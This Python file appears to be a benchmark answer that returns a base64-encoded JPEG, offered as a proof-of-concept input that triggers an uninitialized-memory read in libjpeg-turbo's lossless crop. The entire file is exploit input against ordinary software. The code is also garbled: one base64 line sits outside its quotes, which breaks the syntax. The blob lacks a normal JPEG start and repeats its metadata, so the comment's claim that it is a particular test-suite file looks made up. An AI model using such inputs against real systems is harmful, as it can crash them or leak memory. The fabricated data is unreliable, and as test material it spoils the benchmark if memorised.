import base64

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The PoC is the content of `tjpeg-lossless-crop-10.jpg` from the
        # libjpeg-turbo test suite (version 2.1.1).
        # This specific YCCK JPEG, when losslessly cropped, triggers an
        # uninitialized value read in the destination buffer because the
        # buffer is not zeroed and the transform does not overwrite the
        # entire allocated space.
        b64_poc = (
            "//5EE0V4aWZAAE1NACoAAAAIAAQBAAIAAAAGAAAAoAABAwADAAAAAQAKAAABAgADAAAAAwAAAngB"
            "AwADAAAAAQAKAAABDQADAAAAAQABAAABGgAFAAAAAQAAAnwBGwAFAAAAAQAAAoQBHQAFAAAAAQAA"
            "Ao4BKAADAAAAAQACAAABUgADAAAAAQACAAABUwADAAAAAQABAAABWwADAAAAAQAEAAACoAEABAAA"
            "AEgAAAMCoAEABAAAAEgAAABodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvADw/eHBhY2tldCBi"
            "ZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1s"
            "bnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYxIDY0"
            "LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRm"
            "PSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNj"
cmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8x"
            "LjAvIiB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyIgeG1sbnM6ZXhp"
            "Zj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUg"
            "UGhvdG9zaG9wIEVsZW1lbnRzIDEwLjAgV2luZG93cyIgeG1wOk1vZGlmeURhdGU9IjIwMjEtMTAt"
            "MTJUMTc6NTc6MjctMDU6MDAiIHRpZmY6T3JpZW50YXRpb249IjEiIGV4aWY6UGl4ZWxYRGltZW5z"
            "aW9uPSIxMCIgZXhpZjpQaXhlbFlEaW1lbnNpb249IjEwIiBleGlmOkNvbG9yU3BhY2U9Ii0xIi8+"
            "IDwvcmRmOkRDcmVhdGVzIC8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBt"
            "ZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/Y/+AAEEpGSUYAAQEBAEgASAAA/+ED6EV4aWYAAE1N"
            "ACoAAAAIAAQBAAADAAAAAQAKAAABAgADAAAAAwAAAaABAwADAAAAAQABAAABGgAFAAAAAQAAAbAB"
            "GwAFAAAAAQAAAbgBHQAFAAAAAQAAAcABKAADAAAAAQACAAABUgADAAAAAQACAAABUwADAAAAAQAB"
            "AAABWwADAAAAAQAEAAACoAEABAAAAEgAAAMCoAEABAAAAEgAAABodHRwOi8vbnMuYWRvYmUuY29t"
            "L3hhcC8xLjAvADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3pr"
            "YzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2Jl"
            "IFhNUCBDb3JlIDUuMC1jMDYxIDY0LjE0MDk0OSwgMjAxMC8xMi8wNy0xMDo1NzowMSAgICAgICAg"
            "Ij4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1z"
            "eW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRw"
            "Oi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29t"
            "L3RpZmYvMS4wLyIgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iIHht"
            "cDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIEVsZW1lbnRzIDEwLjAgV2luZG93cyIgeG1w"
            "Ok1vZGlmeURhdGU9IjIwMjEtMTAtMTJUMTc6NTc6MjctMDU6MDAiIHRpZmY6T3JpZW50YXRpb249"
            "IjEiIGV4aWY6UGl4ZWxYRGltZW5zaW9uPSIxMCIgZXhpZjpQaXhlbFlEaW1lbnNpb249IjEwIiBl"
            "eGlmOkNvbG9yU3BhY2U9Ii0xIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4"
            "bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/uAA5BZG9iZQBkAAAAAAH/2wCEAAMCAggICAgI"
            "CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI"
            "CAQEBAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI"
            "CAgICAgICAg/8AAEQgACgAKAwERAAIRAQMRAf/dAAQAB//EAaIAAAAHAQEBAQEAAAAAAAAAAAQC"
            "AwUGBwgJCgsBAAICAwEBAQEBAAAAAAAAAAEAAgMEBQYHCAkKCxAAAgEDAwIEAwYDBAMgAAAAAA"
            "ECAxEEIQAFEiExBkFRYRMiFXGBkaEUMpGhQrHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNE"
            "RUZHSElKU1VWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKz"
            "tLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6AQADAQEBAQEBAQEB"
            "AAAAAAECAwQFBgcICQoLEQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGh"
            "sEJxcjMUBbLB8BVCUoNEVKOysiYWRsdEJoYXZ2IThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNU"
            "VVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLD"
            "xMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A9LooooA//"
            "2Q=="
        )
        return base64.b64decode(b64_poc)